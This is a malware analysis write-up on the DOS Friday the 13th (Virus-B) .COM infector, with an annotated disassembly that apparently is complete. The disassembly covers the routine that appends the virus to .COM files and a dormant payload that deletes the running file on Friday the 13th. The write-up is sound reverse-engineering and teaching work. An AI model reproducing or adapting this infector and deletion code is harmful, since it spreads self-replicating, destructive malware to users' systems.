<!--Add date: 01/21/2021-->

<h1>Friday the 13th (540.A Demo "Virus-B")</h1>

<h2>Malware Reverse Engineering Documentation</h2>

<h3>Writeup by YR81</h3>

<p>Attached is a listing of a variant (Virus-B) of the Friday the 13th computer virus, which infected DOS COMMAND (.COM) programs. The sample can be obtained from <a href = "https://github.com/ytisf/theZoo/blob/master/malwares/Binaries/Friday_the_13th.540.A/Friday_the_13th.540.A.zip" target = "_blank">The Zoo</a> malware repository. This variation is a clean version that does not execute its malicious payload, unlike others that delete the currently running file if the date is Friday the 13th (see <a href = "https://www.youtube.com/watch?v=u3k-8kJ54sg" target = "_blank">this video by danooct1</a> for a good demonstration). The malicious code is still in the sample (see offset <code>seg000:03B7</code>), but it is never called.</p>

<p>The gist of the virus - it is a postfix virus that overwrites the first three bytes of a healthy program text to perform a jump to the virus. The virus scans the current directory for .COM programs using the DOS API's file find utilities. Upon locating a file that is not <code>COMMAND.COM</code>, the virus first copies the first three bytes to its memory. It then checks if the file has already been infected with Virus-B by comparing the first instruction of the file to a correct jump. If the file has not been infected, the jump instruction that will override the original entrypoint is calculated and written to the beginning of the file. Finally, the rest of the virus is written to the end of the original program, aligned to a 16-byte boundary. The virus restores the context and the first three bytes of the currently-running program and returns to it.</p>

<p>Note that this virus would be particularly easy to clean. We just need to find the virus entry point, advance 3 bytes, overwrite the virus branch at the beginning of the file, and delete everything from the virus entry point to the end of the file.</p>

<p>Again, there are many variations of this virus, some of which will in fact harm files if executed on a "bad" date. Always exercise caution when analyzing malware samples.</p>

<pre class = "x86asm">
seg000:0100 ;
seg000:0100 ; +-------------------------------------------------------------------------+
seg000:0100 ; |	  This file has	been generated by The Interactive Disassembler (IDA)	|
seg000:0100 ; |		  Copyright (c)	2015 Hex-Rays, <support@hex-rays.com>		|
seg000:0100 ; +-------------------------------------------------------------------------+
seg000:0100 ;
seg000:0100 ; Input MD5	  : B47E5E32AF0E89854D7BCD5B7DA93E97
seg000:0100 ; Input CRC32 : 31E13561
seg000:0100
seg000:0100 ; ---------------------------------------------------------------------------
seg000:0100 ; File Name	  : C:\Users\********\Desktop\Projects\Hacking\samples\Friday_the_13th.540.A\Friday_the_13th.540.A.pdf
seg000:0100 ; Format	  : Binary file
seg000:0100 ; Base Address: 0000h Range: 0000h - 02FCh Loaded length: 000002FCh
seg000:0100
seg000:0100		    .686p
seg000:0100		    .mmx
seg000:0100		    .model flat
seg000:0100
seg000:0100 ; ===========================================================================
seg000:0100
seg000:0100 ; Segment type: Regular
seg000:0100 seg000	    segment byte public	'CODE' use16
seg000:0100		    assume cs:seg000
seg000:0100		    ;org 100h
seg000:0100		    assume es:nothing, ss:nothing, ds:nothing, fs:nothing, gs:nothing
seg000:0100
seg000:0100 entry:				    ; DATA XREF: pivot+Co
seg000:0100					    ; virusMain+11Cw ...
seg000:0100		    jmp	    near ptr virusEntry
seg000:0103
seg000:0103 loc_103:				    ; DATA XREF: infectCOM+26r
seg000:0103					    ; infectCOM+3Dr ...
seg000:0103		    mov	    ah,	9	    ; original program
seg000:0105
seg000:0105 loc_105:				    ; DATA XREF: infectCOM+2Ar
seg000:0105					    ; infectCOM:loc_3A8w ...
seg000:0105		    int	    21h		    ; DOS - PRINT STRING
seg000:0105					    ; DS:DX -> string terminated by "$"
seg000:0107		    mov	    ax,	4C00h
seg000:010A		    int	    21h		    ; DOS - 2+ - QUIT WITH EXIT	CODE (EXIT)
seg000:010A					    ; AL = exit	code
seg000:010A ; ---------------------------------------------------------------------------
seg000:010C aC1993AmericanEag db '(C) 1993 American Eagle Publications Inc., All Rights Reserved. U'
seg000:010C					    ; DATA XREF: infectCOM+3Ar
seg000:010C					    ; infectCOM+64w ...
seg000:010C		    db 'nauthorized ',0Dh,0Ah
seg000:010C		    db 'use will be prosecuted under applicable copyright and software pi'
seg000:010C		    db 'racy laws.',0Dh,0Ah
seg000:010C		    db 'HOST #1 - You have just released a virus!$',0
seg000:01D3		    db	  0
seg000:01D4		    db	  0
seg000:01D5		    db	  0
seg000:01D6		    db	86h ; †
seg000:01D7		    db 0BEh ; ¾
seg000:01D8		    db	59h ; Y
seg000:01D9		    db	1Ch
seg000:01DA		    db 0BBh ; »
seg000:01DB		    db	14h
seg000:01DC		    db	  0
seg000:01DD		    db	  0
seg000:01DE		    db	  0
seg000:01DF		    db	  0
seg000:01E0
seg000:01E0 ; =============== S	U B R O	U T I N	E =======================================
seg000:01E0
seg000:01E0 ; Attributes: thunk
seg000:01E0
seg000:01E0 virusEntry	    proc far
seg000:01E0		    jmp	    near ptr pivot
seg000:01E0 virusEntry	    endp
seg000:01E0
seg000:01E0 ; ---------------------------------------------------------------------------
seg000:01E3 originalProg    db 0BAh, 0Ch, 1	    ; original bytes of	this program
seg000:01E3					    ; mov dx, 0x10c -> string used by original program
seg000:01E6 aInfected	    db 'INFECTED',0
seg000:01EF jmpVirus	    db 0E9h, 0DDh, 0	    ; jump to virus; replaces original bytes
seg000:01F2 a_com	    db '*.COM',0
seg000:01F8 warning	    db 'WARNING!!!!  THIS PROGRAM IS INFECTED WITH VIRUS-B!',0Dh,0Ah
seg000:01F8		    db 'IT WILL INFECT EVERY .COM FILE IN THE CURRENT SUBDIRECTORY!',0Dh,0Ah
seg000:01F8		    db 7,'$'
seg000:026C attribute	    db 3		    ; start of DTA structure
seg000:026D drive	    db 3Fh
seg000:026E searchName	    db '???????COM',0
seg000:0279 directoryEntry  dw 6
seg000:027B startingCluster dw 24Ch
seg000:027D		    dw 0
seg000:027F		    dw 0		    ; DOS 2.0+ starting	cluster
seg000:0281 attributeMatching db 20h
seg000:0282 fileTime	    dw 90CBh
seg000:0284 fileDate	    dw 1B72h
seg000:0286 fileSize	    dd 0D2h
seg000:028A nameMatch	    db '001.COM',0,'OM',0,0,0
seg000:0297 command	    db 'COMMAND.COM',0
seg000:02A3
seg000:02A3 ; =============== S	U B R O	U T I N	E =======================================
seg000:02A3
seg000:02A3 ; Attributes: bp-based frame
seg000:02A3
seg000:02A3 pivot	    proc far		    ; CODE XREF: virusEntryj
seg000:02A3
seg000:02A3 var_s10	    = word ptr	10h
seg000:02A3
seg000:02A3		    push    cs
seg000:02A4		    push    ax		    ; <- sp1 + 0x10
seg000:02A5		    push    ax
seg000:02A6		    push    bx
seg000:02A7		    push    cx
seg000:02A8		    push    dx
seg000:02A9		    push    si
seg000:02AA		    push    di
seg000:02AB		    push    bp
seg000:02AC		    push    ds		    ; <- sp1
seg000:02AD		    mov	    bp,	sp
seg000:02AF		    mov	    word ptr [bp+10h], offset entry
seg000:02B4		    call    $+3
seg000:02B7		    pop	    ax		    ; ax = 0x2b7
seg000:02B8		    sub	    ax,	0D7h ; '×'  ; ax = 0x1e0
seg000:02BB		    mov	    cl,	4
seg000:02BD		    shr	    ax,	cl	    ; ax = 0x1e
seg000:02BF		    mov	    bx,	cs
seg000:02C1		    add	    ax,	bx	    ; ax [seg] -> cs:0x1e0
seg000:02C3		    sub	    ax,	10h	    ; ax [seg] -> cs:0xe0
seg000:02C6		    push    ax
seg000:02C7		    mov	    ax,	1ECh
seg000:02CA		    push    ax
seg000:02CB		    retf		    ; return to	cs:0x2cc
seg000:02CB pivot	    endp ; sp-analysis failed
seg000:02CB
seg000:02CC
seg000:02CC ; =============== S	U B R O	U T I N	E =======================================
seg000:02CC
seg000:02CC
seg000:02CC virusMain	    proc far
seg000:02CC
seg000:02CC ; FUNCTION CHUNK AT	seg000:03E5 SIZE 00000017 BYTES
seg000:02CC
seg000:02CC		    mov	    ax,	cs
seg000:02CE		    mov	    ds,	ax	    ; ds = cs +	0xe
seg000:02D0		    push    ax
seg000:02D1		    push    dx
seg000:02D2		    mov	    ah,	9
seg000:02D4		    mov	    dx,	118h	    ; ds:dx = cs:(0xe0 + 0x118)	= cs:0x1f8
seg000:02D4					    ; -> warning
seg000:02D7		    int	    21h		    ; DOS - PRINT STRING
seg000:02D7					    ; DS:DX -> string terminated by "$"
seg000:02D9		    pop	    ax
seg000:02DA		    pop	    dx
seg000:02DB		    call    scanDir
seg000:02DE		    jmp	    loc_3E5	    ; ds:0x103 = cs:(0xe0 + 0x103) = cs:0x1e3
seg000:02DE virusMain	    endp ; sp-analysis failed ;	-> originalProg
seg000:02DE
seg000:02E1
seg000:02E1 ; =============== S	U B R O	U T I N	E =======================================
seg000:02E1
seg000:02E1
seg000:02E1 scanDir	    proc near		    ; CODE XREF: virusMain+Fp
seg000:02E1		    push    es
seg000:02E2		    push    ds
seg000:02E3		    pop	    es		    ; mov es, ds = cs +	0xe
seg000:02E4		    mov	    ah,	1Ah
seg000:02E6		    mov	    dx,	18Ch	    ; ds:dx = cs:(0xe0 + 0x18c)	= cs:0x26c
seg000:02E9		    int	    21h		    ; DOS - SET	DISK TRANSFER AREA ADDRESS
seg000:02E9					    ; DS:DX -> disk transfer buffer
seg000:02EB		    mov	    ah,	4Eh ; 'N'
seg000:02ED		    xor	    cx,	cx
seg000:02EF		    mov	    dx,	112h	    ; ds:dx = cs:(0xe0 + 0x112)	= cs:0x1f2
seg000:02EF					    ; -> a_com
seg000:02F2		    int	    21h		    ; DOS - 2+ - FIND FIRST ASCIZ (FINDFIRST)
seg000:02F2					    ; CX = search attributes
seg000:02F2					    ; DS:DX -> ASCIZ filespec
seg000:02F2					    ; (drive, path, and	wildcards allowed)
seg000:02F4		    jb	    short loc_2FF
seg000:02F6
seg000:02F6 loc_2F6:				    ; CODE XREF: scanDir+1Cj
seg000:02F6		    call    infectCOM
seg000:02F9		    mov	    ah,	4Fh
seg000:02FB		    int	    21h		    ; DOS - 2+ - FIND NEXT ASCIZ (FINDNEXT)
seg000:02FB					    ; [DTA] = data block from
seg000:02FB					    ; last AH =	4Eh/4Fh	call
seg000:02FD		    jnb	    short loc_2F6
seg000:02FF
seg000:02FF loc_2FF:				    ; CODE XREF: scanDir+13j
seg000:02FF		    pop	    ax
seg000:0300		    push    ax		    ; restore disk transfer area address
seg000:0301		    push    ds
seg000:0302		    mov	    ds,	ax
seg000:0304		    mov	    ah,	1Ah
seg000:0306		    mov	    dx,	80h ; '€'   ; ds:dx = es:0x80
seg000:0309		    int	    21h		    ; DOS - SET	DISK TRANSFER AREA ADDRESS
seg000:0309					    ; DS:DX -> disk transfer buffer
seg000:030B		    pop	    ds
seg000:030C		    pop	    es
seg000:030D		    retn
seg000:030D scanDir	    endp
seg000:030D
seg000:030E
seg000:030E ; =============== S	U B R O	U T I N	E =======================================
seg000:030E
seg000:030E
seg000:030E infectCOM	    proc near		    ; CODE XREF: scanDir:loc_2F6p
seg000:030E		    push    es
seg000:030F		    mov	    ax,	ds
seg000:0311		    mov	    es,	ax	    ; es = ds =	cs + 0xe
seg000:0313		    mov	    si,	1AAh	    ; ds:si = cs:(0xe0 + 0x1aa)	= cs:0x28a
seg000:0313					    ; -> nameMatch
seg000:0316		    mov	    di,	1B7h	    ; es:di = cs:(0xe0 + 0x1b7)	= cs:0x297
seg000:0316					    ; -> command
seg000:0319		    mov	    cx,	12
seg000:031C		    cld
seg000:031D		    repe cmpsb
seg000:031F		    pop	    es
seg000:0320		    jnz	    short loc_325   ; if COMMAND.COM, do not infect
seg000:0322		    jmp	    locret_3B6
seg000:0325 ; ---------------------------------------------------------------------------
seg000:0325
seg000:0325 loc_325:				    ; CODE XREF: infectCOM+12j
seg000:0325		    mov	    ax,	3D02h	    ; open the file
seg000:0328		    mov	    dx,	1AAh	    ; ds:dx = cs:0x28a
seg000:0328					    ; -> nameMatch
seg000:032B		    int	    21h		    ; DOS - 2+ - OPEN DISK FILE	WITH HANDLE
seg000:032B					    ; DS:DX -> ASCIZ filename
seg000:032B					    ; AL = access mode
seg000:032B					    ; 2	- read & write
seg000:032D		    jnb	    short loc_332
seg000:032F		    jmp	    loc_3B4
seg000:0332 ; ---------------------------------------------------------------------------
seg000:0332
seg000:0332 loc_332:				    ; CODE XREF: infectCOM+1Fj
seg000:0332		    mov	    bx,	ax
seg000:0334		    push    word ptr ds:loc_103	; original program
seg000:0338		    push    word ptr ds:loc_105
seg000:033C		    mov	    ah,	3Fh ; '?'
seg000:033E		    mov	    cx,	3	    ; read 3 bytes
seg000:0341		    mov	    dx,	103h	    ; cs:0x1e3 -> originalProg
seg000:0344		    int	    21h		    ; DOS - 2+ - READ FROM FILE	WITH HANDLE
seg000:0344					    ; BX = file	handle,	CX = number of bytes to	read
seg000:0344					    ; DS:DX -> buffer
seg000:0346		    jb	    short loc_3A8
seg000:0348		    mov	    al,	byte ptr ds:aC1993AmericanEag+3	; cs:0x1ef -> 0xe9 (jmp)
seg000:034B		    cmp	    byte ptr ds:loc_103, al ; original program
seg000:034F		    jnz	    short loc_360
seg000:0351		    mov	    ax,	word ptr ds:aC1993AmericanEag+9Ah ; cs:0x286 ->	fileSize
seg000:0354		    sub	    ax,	540	    ; subtract size of virus
seg000:0357		    sub	    ax,	3	    ; to get right jump	target,	rel. next address
seg000:0357					    ; after the	jump instruction
seg000:035A		    cmp	    word ptr ds:loc_103+1, ax ;	cs:0x1e4
seg000:035E		    jz	    short loc_3A8   ; if equal,	file already infected
seg000:035E					    ; don't reinfect
seg000:0360
seg000:0360 loc_360:				    ; CODE XREF: infectCOM+41j
seg000:0360		    mov	    ax,	4202h
seg000:0363		    xor	    cx,	cx
seg000:0365		    xor	    dx,	dx
seg000:0367		    int	    21h		    ; DOS - 2+ - MOVE FILE READ/WRITE POINTER (LSEEK)
seg000:0367					    ; AL = method: offset from end of file
seg000:0369		    jb	    short loc_3A8   ; ax -> end	of file
seg000:036B		    or	    ax,	0Fh	    ; align virus to 16-byte grid
seg000:036E		    inc	    ax
seg000:036F		    sub	    ax,	3
seg000:0372		    mov	    word ptr ds:aC1993AmericanEag+4, ax	; cs:0x1f0 -> jump target
seg000:0375		    mov	    ax,	4200h
seg000:0378		    xor	    cx,	cx
seg000:037A		    xor	    dx,	dx
seg000:037C		    int	    21h		    ; DOS - 2+ - MOVE FILE READ/WRITE POINTER (LSEEK)
seg000:037C					    ; AL = method: offset from beginning of file
seg000:037E		    jb	    short loc_3A8
seg000:0380		    mov	    ah,	40h ; '@'
seg000:0382		    mov	    cx,	3	    ; write 3 bytes to beginning of file
seg000:0385		    mov	    dx,	10Fh	    ; cs:0x1ef -> jmpVirus snippet
seg000:0388		    int	    21h		    ; DOS - 2+ - WRITE TO FILE WITH HANDLE
seg000:0388					    ; BX = file	handle,	CX = number of bytes to	write, DS:DX ->	buffer
seg000:038A		    jb	    short loc_3A8
seg000:038C		    mov	    ax,	4201h
seg000:038F		    xor	    cx,	cx
seg000:0391		    mov	    dx,	word ptr ds:aC1993AmericanEag+4	; cs:0x1f0 -> jump target
seg000:0395		    int	    21h		    ; DOS - 2+ - MOVE FILE READ/WRITE POINTER (LSEEK)
seg000:0395					    ; AL = method: offset from present location
seg000:0397		    jb	    short loc_3A8
seg000:0399		    mov	    ah,	40h ; '@'
seg000:039B		    mov	    cx,	540	    ; size of virus
seg000:039E		    mov	    dx,	100h	    ; cs:0x1e0 -> virusEntry point
seg000:03A1		    int	    21h		    ; DOS - 2+ - WRITE TO FILE WITH HANDLE
seg000:03A1					    ; BX = file	handle,	CX = number of bytes to	write, DS:DX ->	buffer
seg000:03A3		    jb	    short loc_3A8
seg000:03A5		    jmp	    short loc_3A8
seg000:03A5 ; ---------------------------------------------------------------------------
seg000:03A7		    db	90h ; 
seg000:03A8 ; ---------------------------------------------------------------------------
seg000:03A8
seg000:03A8 loc_3A8:				    ; CODE XREF: infectCOM+38j
seg000:03A8					    ; infectCOM+50j ...
seg000:03A8		    pop	    word ptr ds:loc_105
seg000:03AC		    pop	    word ptr ds:loc_103	; original program
seg000:03B0		    mov	    ah,	3Eh
seg000:03B2		    int	    21h		    ; DOS - 2+ - CLOSE A FILE WITH HANDLE
seg000:03B2					    ; BX = file	handle
seg000:03B4
seg000:03B4 loc_3B4:				    ; CODE XREF: infectCOM+21j
seg000:03B4		    jnb	    short $+2
seg000:03B6
seg000:03B6 locret_3B6:				    ; CODE XREF: infectCOM+14j
seg000:03B6					    ; infectCOM:loc_3B4j
seg000:03B6		    retn
seg000:03B6 infectCOM	    endp
seg000:03B6
seg000:03B7
seg000:03B7 ; =============== S	U B R O	U T I N	E =======================================
seg000:03B7
seg000:03B7 ; the malicious payload
seg000:03B7 ; deletes file if run on Fri. 13
seg000:03B7 ; save [1]
seg000:03B7
seg000:03B7 payload	    proc near
seg000:03B7		    push    es
seg000:03B8		    mov	    ah,	2Ah
seg000:03BA		    int	    21h		    ; DOS - GET	CURRENT	DATE
seg000:03BA					    ; Return: DL = day,	DH = month, CX = year
seg000:03BA					    ; AL = day of the week (0=Sunday, 1=Monday,	etc.)
seg000:03BC		    cmp	    dl,	13	    ; check date against 13
seg000:03BF		    jnz	    short loc_3E3   ; restore [1]
seg000:03C1		    cmp	    al,	5	    ; check day	of the week against 5 (Friday)
seg000:03C3		    jnz	    short loc_3E3   ; restore [1]
seg000:03C5		    xor	    ax,	ax
seg000:03C7		    mov	    cx,	7FFFh	    ; size of string to	scan
seg000:03CA		    xor	    di,	di
seg000:03CC		    mov	    es,	word ptr es:2Ch	; es = segment address of the environment
seg000:03D1		    cld
seg000:03D2		    repne scasw		    ; scan until end of	environment string
seg000:03D2					    ; should be	where program name begins
seg000:03D4		    jnz	    short loc_3E3   ; restore [1]
seg000:03D6		    add	    di,	2	    ; skip drive name
seg000:03D9		    push    ds		    ; save [2]
seg000:03DA		    push    es
seg000:03DB		    pop	    ds		    ; move es into ds
seg000:03DC		    mov	    ah,	41h ; 'A'
seg000:03DE		    mov	    dx,	di	    ; delete this file
seg000:03E0		    int	    21h		    ; DOS - 2+ - DELETE	A FILE (UNLINK)
seg000:03E0					    ; DS:DX -> ASCIZ pathname of file to delete	(no wildcards allowed)
seg000:03E2		    pop	    ds		    ; restore [2]
seg000:03E3
seg000:03E3 loc_3E3:				    ; CODE XREF: payload+8j
seg000:03E3					    ; payload+Cj ...
seg000:03E3		    pop	    es		    ; restore [1]
seg000:03E4		    retn
seg000:03E4 payload	    endp
seg000:03E4
seg000:03E5 ; ---------------------------------------------------------------------------
seg000:03E5 ; START OF FUNCTION	CHUNK FOR virusMain
seg000:03E5
seg000:03E5 loc_3E5:				    ; CODE XREF: virusMain+12j
seg000:03E5		    mov	    ax,	word ptr ds:loc_103 ; ds:0x103 = cs:(0xe0 + 0x103) = cs:0x1e3
seg000:03E5					    ; -> originalProg
seg000:03E8		    mov	    word ptr es:entry, ax
seg000:03EC		    mov	    al,	byte ptr ds:loc_105
seg000:03EF		    mov	    byte ptr es:entry+2, al
seg000:03F3		    pop	    ds		    ; restore context
seg000:03F4		    pop	    bp
seg000:03F5		    pop	    di
seg000:03F6		    pop	    si
seg000:03F7		    pop	    dx
seg000:03F8		    pop	    cx
seg000:03F9		    pop	    bx
seg000:03FA		    pop	    ax
seg000:03FB		    retf		    ; return to	original program
seg000:03FB ; END OF FUNCTION CHUNK FOR	virusMain
seg000:03FB seg000	    ends
seg000:03FB
seg000:03FB
seg000:03FB		    end    
</pre>